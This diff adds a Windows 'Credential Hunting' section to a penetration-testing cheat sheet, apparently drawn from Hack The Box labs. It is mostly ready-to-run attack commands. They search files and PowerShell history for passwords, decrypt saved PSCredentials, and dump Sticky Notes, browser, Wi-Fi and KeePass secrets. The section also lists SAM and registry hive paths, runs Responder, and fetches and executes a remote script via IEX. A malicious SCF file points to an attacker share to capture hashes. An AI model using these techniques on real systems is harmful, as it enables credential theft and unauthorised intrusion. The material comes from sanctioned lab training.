@@ -637,6 +637,242 @@ set-ExecutionPolicy Bypass -Scope Process
 ```
 Execute the duval.ps1, I had to use Powershell ISE to get it to work properly. 
 
+# Credential Hunting
+## Findstr
+```
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+```
+Files to search for
+```
+web.config
+unattended.xml
+C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+### Confirm the powershell History Location
+```
+(Get-PSReadLineOption).HistorySavePath
+```
+### Reading PS Histroy Location
+```
+gc (Get-PSReadLineOption).HistorySavePath
+```
+### View all PS Histroy that we have access too
+```
+foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
+ ```
+## Chrome dictionary files
+```
+gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+```
+Decrypting PowerShell Credentials
+```
+<?xml version="1.0"?>
+
+-<Objs xmlns="http://schemas.microsoft.com/powershell/2004/04" Version="1.1.0.1">
 
 
+-<Obj RefId="0">
 
+
+-<TN RefId="0">
+
+<T>System.Management.Automation.PSCredential</T>
+
+<T>System.Object</T>
+
+</TN>
+
+<ToString>System.Management.Automation.PSCredential</ToString>
+
+
+-<Props>
+
+<S N="UserName">bob</S>
+
+<SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000016548747b77ab84f9262fa5a851d5f71000000000200000000001066000000010000200000002494ddabd3338a4fccf788171788421fefac6998b41a9c05beeb5a9a5dc39cb6000000000e8000000002000020000000736dfd85852ebbabd9d902c6450c4c51ee78f0d2e4f5c895dc1363b7178f2e0c30000000017cca90a9f8861150c51de9504bb3a3e591b85f834f8b53134f5258541fbda6ec9941ae6fa99db5e0b2e82ba0a170b04000000064b5740c7e8f2e845293abdf942e54dff0e4a563770b99e7cf9d74b6e7726143ade7ce82db92689f59291826b32098553e6b3786e3bacf4ee1af0df529b9a583</SS>
+
+</Props>
+
+</Obj>
+
+</Objs>
+```
+```
+$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+```
+```
+$credential.GetNetworkCredential().username
+```
+```
+$credential.GetNetworkCredential().password
+```
+## Connecting with PowerShell Credentials
+```
+# Connect-VC.ps1
+# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
+$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
+$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
+Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString
+```
+# Other Files
+```
+cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
+```
+```
+findstr /si password *.xml *.ini *.txt *.config
+```
+```
+findstr /spin "password" *.*
+```
+```
+select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+```
+```
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+```
+```
+where /R C:\ *.config
+```
+```
+Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
+```
+### Sticky Notes
+```
+C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+```
+Open file in SQLite on Kali box
+![image](https://user-images.githubusercontent.com/128841823/233461502-c7d5461f-5209-4f77-a198-087255149486.png)
+### Opening Sticky Notes with PS
+```
+PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
+
+PS C:\htb> cd .\PSSQLite\
+PS C:\htb> Import-Module .\PSSQLite.psd1
+PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
+ 
+Text
+----
+\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
+\id=e4adae4c-a40b-48b4-93a5-900247852f96
+\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
+\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
+```
+### Using Strings
+```
+strings plum.sqlite
+```
+### Other interesting files 
+```
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+```
+## Cmdkey Saved Credentials
+```
+cmdkey /list
+```
+Attempt to use RDP 
+![image](https://user-images.githubusercontent.com/128841823/233463653-3be0fd0c-25da-4ca2-9754-b5754259132b.png)
+We can also attempt to reuse the credentials using runas to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:
+```
+runas /savecred /user:inlanefreight\bob "COMMAND HERE"
+```
+### Browser Credentials
+```
+.\SharpChrome.exe logins /unprotect
+```
+### Password Managers
+```
+python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
+```
+```
+hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
+```
+### E-Mail
+https://github.com/dafthack/MailSniper
+### Lazange
+```
+.\lazagne.exe all
+```
+### Session Gopher
+```
+Import-Module .\SessionGopher.ps1
+```
+```
+Invoke-SessionGopher -Target WINLPE-SRV01
+```
+### Wifi Passwords
+```
+netsh wlan show profile
+```
+```
+netsh wlan show profile ilfreight_corp key=clear
+```
+# Interacting with Users
+### Wireshark
+capture traffic and then filter it with net-credy.py in tools folder
+```
+sudo python2 net-creds.py -i tun0
+[*] Using interface: tun0
+                                                                                                                                                       ❯ sudo python2 net-creds.py -p /home/p3ta/HTB/test.pcap
+```
+### Monitoring Processes with Powershell
+```
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+```
+### Elevating with Docker
+https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e
+### Running monitor Script on target machine
+```
+IEX (iwr 'http://10.10.10.205/procmon.ps1')
+```
+### Responder
+Run it from tools/responder
+```
+sudo ./Responder.py -wrf -v -I tun0
+```
+### Lnkbomb
+https://github.com/dievus/lnkbomb
+### Malicious SCF File
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/
+### Hashcat captured Hashes
+```
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
